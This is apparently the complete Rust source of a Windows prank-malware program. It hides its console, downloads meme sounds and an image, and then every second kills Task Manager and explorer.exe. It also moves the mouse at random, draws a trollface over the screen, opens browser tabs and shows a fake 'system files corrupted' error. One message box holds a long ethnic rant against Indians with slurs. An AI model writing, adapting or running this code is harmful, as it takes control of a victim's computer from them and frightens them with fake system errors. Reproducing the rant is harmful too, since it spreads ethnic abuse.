#![windows_subsystem = "windows"]

#[macro_use]
extern crate lazy_static;

use std::{path::Path, error::Error, mem::size_of, sync::{mpsc::{self, Receiver, Sender}}, collections::HashSet, io::Cursor, task::Poll, time::{Duration, Instant}, thread};
use windows::{core::{self as wincore, PCSTR}, s, Win32::{Foundation::{POINT, CHAR, BOOL, CloseHandle}, System::{Threading::{OpenProcess, PROCESS_TERMINATE, TerminateProcess}, Diagnostics::ToolHelp::{TH32CS_SNAPPROCESS, PROCESSENTRY32, CreateToolhelp32Snapshot, Process32First, Process32Next}}, Graphics::Gdi::{HBITMAP, SRCCOPY, Rectangle, GetDC, ReleaseDC, CreateCompatibleDC, SelectObject, BitBlt}, UI::WindowsAndMessaging::{LR_LOADFROMFILE, MB_OK, MB_ICONWARNING, IMAGE_BITMAP, LoadImageA, MessageBoxA, SetCursorPos, GetCursorPos, GetSystemMetrics, SM_CXSCREEN, SM_CYSCREEN}}};
use rand::{self, Rng, distributions::uniform::SampleRange};
use reqwest;
use tokio::{task, io::{AsyncWriteExt, AsyncReadExt}, fs::{self, File}};
use rodio::{Decoder, OutputStream, OutputStreamHandle, PlayError, Source, source::Buffered};
use bytes::Bytes;
use image::{self, EncodableLayout, GenericImageView, ImageFormat, imageops::FilterType};

const RES_DIR: &str = "./res";
const LOGO_SIZE: (i32, i32) = (1280, 720);

lazy_static! {
    static ref SCREEN_SIZE: (i32, i32) = unsafe {
        (GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN))
    };
}

const IMAGE_FORMATS: [&str; 8] = ["bmp", "BMP", "png", "PNG", "jpg", "jpeg", "JPG", "JPEG"];

const RESOURCES: [(&str, &str); 15] = [
    ("https://pbs.twimg.com/media/EFNhRehXYAE-vcP?format=jpg&name=large", "trollface.bmp"),
    ("https://www.myinstants.com/media/sounds/video0-1-online-audio-converter.mp3", "mutalaugh.mp3"),
    ("https://www.myinstants.com/media/sounds/dam4rqxu2ywicjk1.mp3", "vineboom2.mp3"),
    ("https://www.myinstants.com/media/sounds/vine-boom-hq-longer.mp3", "vineboom.mp3"),
    ("https://www.myinstants.com/media/sounds/kj0b3uhvi1pr2wjg-online-audio-converter.mp3", "circus.mp3"),
    ("https://www.myinstants.com/media/sounds/among.mp3", "sus.mp3"),
    ("https://www.myinstants.com/media/sounds/bing-chilling_fcdGgUc.mp3", "bingchilling.mp3"),
    ("https://www.myinstants.com/media/sounds/chinese-guy-talk-with-vine-boom.mp3", "chinese.mp3"),
    ("https://www.myinstants.com/media/sounds/video0_k03U0Iy.mp3", "alarm.mp3"),
    ("https://www.myinstants.com/media/sounds/pussi-spam-with-vine-boom.mp3", "idk.mp3"),
    ("https://www.myinstants.com/media/sounds/hello-your-computer-has-virus-sound-effect.mp3", "indian.mp3"),
    ("https://www.myinstants.com/media/sounds/indian-music-meme.mp3", "music.mp3"),
    ("https://www.myinstants.com/media/sounds/speed-screaming-loud-ass-hell.mp3", "scream.mp3"),
    ("https://www.myinstants.com/media/sounds/nokia-ringtone-arabic.mp3", "nokia.mp3"),
    ("https://www.myinstants.com/media/sounds/amogus-bass-boost.mp3", "amogus.mp3")
];

const URLS: [&str; 24] = [
    "https://www.google.com/search?q=Is+my+computer+on+drugs%3F",
    "https://www.google.com/search?q=Does+my+computer+have+a+virus%3F",
    "https://www.google.com/search?q=what+is+1%2B1%3F",
    "https://www.google.com/search?q=azerbaijan",
    "https://www.google.com/search?q=intravenous+cement",
    "https://www.google.com/search?q=im+am+stupids",
    "https://www.google.com/search?q=trollface",
    "https://ftx.com/",
    "https://www.google.com/search?q=free+crypto+miner",
    "https://www.google.com/search?q=my+honest+reaction",
    "https://www.google.com/search?q=FREE+INDIA+PUNJABI+BITCOIN",
    "https://www.google.com/search?q=edible+petroleum+jelly",
    "https://www.google.com/search?q=what",
    "https://www.google.com/search?q=microplastics+dealer",
    "https://www.google.com/search?q=amogus",
    "https://www.google.com/search?q=what+is+my+life+purpose",
    "https://www.google.com/search?q=how+to+fix+brain+damage%3F",
    "https://www.google.com/search?q=schizophrenia+meds",
    "https://www.ebay.com/sch/i.html?_from=R40&_trksid=p2380057.m570.l1313&_nkw=uranium+235&_sacat=0",
    "https://www.businessinsider.com/ways-to-make-money-from-medical-research-and-donations-2018-3",
    "https://www.google.com/search?q=the+voices+are+getting+louder",
    "https://testicularcancersociety.org/?gclid=EAIaIQobChMIo5e75vjM_QIVKfbjBx11nQd-EAAYASAAEgKLdvD_BwE",
    "https://www.reddit.com/r/AmongUsMemes/comments/lo5bcd/get_out_of_my_head_get_out_of_my_head_get_out_of/",
    "https://www.google.com/search?q=best+build+for+tax+evasion"
];

struct PollableInterval {
    interval: Duration,
    last_tick: Instant
}

impl PollableInterval {
    pub fn new(interval: Duration) -> Self {
        Self {
            interval,
            last_tick: Instant::now()
        }
    }

    pub fn reset(&mut self) {
        self.last_tick = Instant::now();
    }

    pub fn tick_in(&mut self, duration: Duration) {
        self.last_tick = Instant::now() - duration;
    }

    pub fn tick(&mut self) -> Poll<()> {
        thread::sleep(Duration::from_millis(100));

        if self.last_tick.elapsed() < self.interval {
            Poll::Pending
        } else {
            self.reset();
            Poll::Ready(())
        }
    }
}

fn warning() {
    unsafe {
        loop {
            thread::sleep(Duration::from_secs(10));
            task::spawn_blocking(|| MessageBoxA(None, s!("A critical error has occurred. Your system files may be corrupted. Windows is trying to fix the issue."), s!("Error"), MB_OK | MB_ICONWARNING));
        }
    }
}

fn india() {
    unsafe {
        loop {
            thread::sleep(Duration::from_secs(15));
            task::spawn_blocking(|| MessageBoxA(None, s!("INDIA MASTER RACE NATION INDIA WORLD SUPAPOWA INDIA VERY BEAUTIFUL BESTEST PEOPLE INDIA COUNTRY CONQUER ALL INDIA SUPAPOWA BIG INDUSTRIES BEST DELHI MUMBAI BEAUTIFUL BIG CITIES FUK YUO WESTERN PIG BITCH INDIA MANY STRONG INDIAN MEN BIG STRONG WESTERN WOMEN WANT INDIAN MEN ðŸ‡®ðŸ‡³ðŸ‡®ðŸ‡³ðŸ‡®ðŸ‡³ðŸ‡®ðŸ‡³ðŸ˜ŽðŸ˜ŽðŸ˜ŽðŸ˜ŽðŸ˜ŽðŸ˜Ž WE FUK YUO IN YOUR FACE BITCH INDIA POPULATION BIG INDIAN MEN STRONG INDIAN WOMEN BEAUTIFUL WE BEST PEOPLE INDIA STRONG COUNTRY WE WIN WW3 BITCH I DARE YUO TO FITE ME IN DELHI VETY BIG CITY BITCH WESTERN BITCH INDIAN MAN BIG IM BIG BITCH I WORK MANY TECH SUPPORT ME VERY RICH INDIA BLESSED BY BUDDHA WE HAVE HINDU CULTURE INDIA SUPAPOWA ðŸ˜ŽðŸ˜ŽðŸ˜ŽðŸ˜ŽðŸ˜ŽðŸ˜ŽðŸ‡®ðŸ‡³ðŸ‡®ðŸ‡³ðŸ‡®ðŸ‡³ðŸ‡®ðŸ‡³ðŸ‡®ðŸ‡³ðŸ‡®ðŸ‡³ðŸ‡®ðŸ‡³ðŸ‡®ðŸ‡³ðŸ‡®ðŸ‡³ðŸ‡®ðŸ‡³ðŸ‡®ðŸ‡³ðŸ‡®ðŸ‡³ðŸ‡®ðŸ‡³ðŸ‡®ðŸ‡³ðŸ‡®ðŸ‡³ BUDDHA BLESSED INDIA COUNTRY WE ARE RICH INDIANS WANTED BY WEST FOR INTELLIGENCE INDIA STRONG COUNTRY MANY COUNTRIES COPY INDIA WE POWAðŸ‡®ðŸ‡³ðŸ‡®ðŸ‡³ðŸ‡®ðŸ‡³ðŸ‡®ðŸ‡³ðŸ‡®ðŸ‡³ GO INDIA ðŸ˜ŽðŸ˜ŽðŸ˜ŽðŸ˜ŽðŸ˜Ž INDIANS WILL BE WOLD MAJORITY WE CONQUER INDIA CLEANEST SAFEST COUNTRY ON EARTH INDIA LEADS THE COMPUTER INDUSTRY INDIA DOMINATES CAR MARKET INDIA LEADER IN SPACE EXPLORATION INDIAN ARMY FEARED WORLDWIDE BY SHITTY WESTERN WHORE COUNTRIES INDIAN MEN DESIRED BY WESTERN WOMEN INDIAN MEN FEARED IM A PROUD INDIAN INDIA SMART INDIA TOP UNIVERSITIES OF MUMBAI WE BLESSED BY COW URINE COW DUNG BLESSINGS OF BUDDHA N HINDUISM DHARMA INDIA LEADS WORLD ECONOMIES ðŸ‡®ðŸ‡³ðŸ‡®ðŸ‡³ðŸ‡®ðŸ‡³ðŸ‡®ðŸ‡³ðŸ‡®ðŸ‡³ðŸ‡®ðŸ‡³ðŸ˜ŽðŸ˜ŽðŸ˜ŽðŸ˜ŽðŸ˜ŽðŸ˜ŽðŸ˜ŽðŸ˜ŽðŸ˜Ž INDIA IS THOUSANDS YEAR OLD INDIA INVENTED MANY THINGS INDIA CULTURE COPIED BY EVERYONE INDIA BEST COUNTRY ðŸ˜ŽðŸ˜ŽðŸ˜ŽðŸ˜ŽðŸ‡®ðŸ‡³ðŸ‡®ðŸ‡³ðŸ‡®ðŸ‡³ðŸ‡®ðŸ‡³ðŸ‡®ðŸ‡³ðŸ‡®ðŸ‡³ðŸ‡®ðŸ‡³ðŸ˜ðŸ˜ðŸ˜ðŸ˜ðŸ˜˜ðŸ˜˜â¤ï¸â¤ï¸IF YUO DARE INSULT INDIA COME THRU ME FIRST WESTERN BITCH WE SCAM YOU COUNTRY WE RICH BITCH COME GET ME FIND ME IN BEAUTIFUL OFFICE IN DELHI IM FORMER NAVY SEAL WANTED BY USA INDIA SPECIAL FORCES SO GOOD EVEN USA PRESIDENT WANTED INDIAN MEN IM INDIA SPECIAL FORCES ARMY BITCH I SERVED STRONGðŸ˜ŽðŸ˜ŽðŸ˜ŽðŸ˜ŽðŸ‡®ðŸ‡³ðŸ‡®ðŸ‡³ðŸ‡®ðŸ‡³ðŸ‡®ðŸ‡³ðŸ‡®ðŸ‡³ðŸ¤¬ðŸ¤¬ðŸ¤¬ðŸ˜¡ðŸ˜¡ðŸ˜¡ðŸ˜¡ðŸ˜¡ðŸ˜¡ðŸ˜¡ðŸ˜¡ðŸ˜¡"), s!(" ÙÙŠ Ø­Ø§Ù„Ø© ØªØ­Ø§Ù„ÙØŒ ÙˆÙ†Ø­Ù† ÙÙŠ Ø­Ø§Ù„Ø© ØªØ®Ø§Ù„ÙÙ‡Ù… ÙˆØµÙ„ÙˆØ§ Ù„Ù…Ø³ØªÙˆÙ‰ Ø§Ù„Ø­ØµØ§Ù†Ø©ØŒ ÙˆÙ†Ø­Ù† Ù…Ø§Ø²Ù„Ù†Ø§ ÙÙŠ Ù…Ø³ØªÙˆÙ‰ Ø§Ù„Ø­Ø¶Ø§Ù†Ø©"), MB_OK));
        }
    }
}

fn trollface(bitmap: Option<HBITMAP>) {
    unsafe {
        let dc2 = CreateCompatibleDC(None);
        let gdi_object = bitmap.map(|bmp| SelectObject(dc2, bmp));

        loop {
            thread::sleep(Duration::from_secs(1));
            let dc = GetDC(None);
            Rectangle(dc, 0,0,12000,6200);

            if gdi_object.is_some() {
                BitBlt(dc, (SCREEN_SIZE.0 / 2) - (LOGO_SIZE.0 / 2), (SCREEN_SIZE.1 / 2) - (LOGO_SIZE.1 / 2), LOGO_SIZE.0, LOGO_SIZE.1, dc2, 0, 0, SRCCOPY);
            }

            ReleaseDC(None, dc);
        }
    }
}

fn mouse_craze() {
    let mut current = POINT::default();
    let mut rng = rand::thread_rng();

    unsafe {
        loop {
            thread::sleep(Duration::from_millis(50));
            GetCursorPos(&mut current as *mut POINT);
            let x = rng.gen_range(-200..=200);
            let y = rng.gen_range(-200..=200);
            SetCursorPos(current.x + x, current.y + y);
        }
    }
}

fn random_sound<G: Rng, R: SampleRange<usize>>(rng: &mut G, sounds: &[Buffered<Decoder<Cursor<Bytes>>>], range: R, handle: &OutputStreamHandle) -> Result<(), PlayError> {
    let sound = &sounds[rng.gen_range(range)];
    handle.play_raw(sound.clone().convert_samples())
}

fn sound(sounds: Vec<Buffered<Decoder<Cursor<Bytes>>>>, rx: Receiver<()>) {
    let mut interval = PollableInterval::new(Duration::from_secs(7));
    let mut stream_renewal = PollableInterval::new(Duration::from_secs(20));
    let mut rng = rand::thread_rng();
    let mut stream = None;

    loop {
        if stream.is_none() {
            stream = OutputStream::try_default().ok();
            continue;
        }

        let s = stream.unwrap();

        match interval.tick() {
            Poll::Pending => match rx.try_recv() {
                Ok(_) => {
                    let sound = &sounds[0];

                    match s.1.play_raw(sound.clone().convert_samples()) {
                        Ok(_) => stream = Some(s),
                        _ => stream = None
                    };

                    println!("Detected task manager");
                    interval.tick_in(Duration::from_secs(4))
                },
                _ => stream = Some(s)
            },
            Poll::Ready(_) => match random_sound(&mut rng, &sounds, 0..sounds.len(), &s.1) {
                Ok(_) => {
                    println!("Played sound");
                    stream = Some(s);
                    interval.reset();
                },
                _ => {
                    stream = None;
                    interval.tick_in(Duration::from_secs(1));
                }
            }
        };

        if let Poll::Ready(_) = stream_renewal.tick() {
            stream = None;
        }
    }
}

fn browser() {
    let mut rng = rand::thread_rng();

    loop {
        let url = URLS[rng.gen_range(0..URLS.len())];

        match open::that(url) {
            Ok(_) => thread::sleep(Duration::from_secs(10)),
            _ => thread::sleep(Duration::from_secs(1))
        };
    }
}

fn kidnap(tx: Sender<()>) {
    unsafe {
        loop {
            thread::sleep(Duration::from_secs(1));
            let handle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0).unwrap();
            let mut process = PROCESSENTRY32::default();
            process.dwSize = size_of::<PROCESSENTRY32>() as u32;

            if Process32First(handle,&mut process).as_bool() {
                while Process32Next(handle, &mut process).as_bool() {
                    if process_name_equals(process.szExeFile, "Taskmgr.exe") {
                        terminate_process(process.th32ProcessID, || {
                            drop(tx.send(()));

                            for _ in 0..10 {
                                task::spawn_blocking(|| MessageBoxA(None, s!("XD"), s!("XD"), MB_ICONWARNING));
                            }
                        });
                    } else if process_name_equals(process.szExeFile, "explorer.exe") {
                        terminate_process(process.th32ProcessID, || ());
                    }
                }
            }

            CloseHandle(handle);
        }
    }
}

fn process_name_equals(process_name: [CHAR; 260], string: &str) -> bool {
    let matches = process_name.iter()
        .zip(string.chars())
        .all(|(a, b)| a.0 == b as u8);

    matches && process_name[string.len()] == CHAR(0)
}

fn terminate_process<F: Fn() -> ()>(pid: u32, callback: F) {
    unsafe {
        match OpenProcess(PROCESS_TERMINATE, BOOL(0), pid) {
            Ok(handle) => {
                TerminateProcess(handle, 0);
                CloseHandle(handle);
                callback();
            },
            Err(e) => println!("{e}")
        };
    }
}

async fn download_resource(url: &str, path: &Path) -> Result<Cursor<Bytes>, Box<dyn Error>> {
    let future = reqwest::get(url);
    let mut file = File::create(path).await?;
    let mut buffer = future.await?.bytes().await?;
    let img_formats = HashSet::from(IMAGE_FORMATS);

    if img_formats.contains(path.extension().unwrap().to_str().unwrap()) {
        let img = image::load_from_memory_with_format(buffer.as_bytes(), ImageFormat::Jpeg)?;
        let img = img.resize(SCREEN_SIZE.0 as u32, SCREEN_SIZE.1 as u32, FilterType::Lanczos3);
        let dimensions = img.dimensions();
        let mut buf = Vec::with_capacity(dimensions.0 as usize * dimensions.1 as usize);
        let mut cur = Cursor::new(&mut buf);
        img.write_to(&mut cur, ImageFormat::Bmp)?;
        buffer = Bytes::from(buf);
    }

    file.write_all(&buffer).await?;
    Ok(Cursor::new(buffer))
}

async fn load_resource(path: &Path) -> Result<Cursor<Bytes>, Box<dyn Error>> {
    let file_future = File::open(path);
    let filesize = fs::metadata(path).await?.len() as usize;
    let mut buffer = vec![0_u8; filesize];
    let mut file = file_future.await?;
    file.read(&mut buffer).await?;
    Ok(Cursor::new(Bytes::from(buffer)))
}

async fn load_resources() -> Vec<Cursor<Bytes>> {
    if !Path::new(RES_DIR).is_dir() {
        fs::create_dir(RES_DIR).await.unwrap();
    }

    let tasks: Vec<_> = RESOURCES.into_iter().map(|(url, filename)| {
        tokio::spawn(async {
            let filename = RES_DIR.to_string() + "/" + filename;
            let path = Path::new(&filename);

            if path.is_file() {
                load_resource(path).await.unwrap()
            } else {
                download_resource(url, path).await.unwrap()
            }
        })
    }).collect();

    let mut res = Vec::new();

    for task in tasks {
        res.push(task.await.unwrap());
    }

    res
}

#[tokio::main]
async fn main() {
    let res = load_resources().await;

    unsafe {
        let logo_path = RES_DIR.to_string() + "/trollface.bmp\0";

        let logo = LoadImageA(None, PCSTR::from_raw(logo_path.as_ptr()), IMAGE_BITMAP, 0, 0, LR_LOADFROMFILE)
            .ok()
            .map(|bmp| HBITMAP(bmp.0));

        let sounds: Vec<_> = res.into_iter()
            .skip(1)
            .map(|r| Decoder::new_mp3(r).unwrap().buffered())
            .collect();

        let mut tasks = Vec::new();
        let (tx, rx) = mpsc::channel();

        tasks.push(task::spawn_blocking(warning));
        tasks.push(task::spawn_blocking(india));
        tasks.push(task::spawn_blocking(browser));
        tasks.push(task::spawn_blocking(mouse_craze));
        tasks.push(task::spawn_blocking(move || kidnap(tx)));
        tasks.push(task::spawn_blocking(move || sound(sounds, rx)));
        tasks.push(task::spawn_blocking(move || trollface(logo)));

        for task in tasks {
            task.await.unwrap();
        }
    }
}
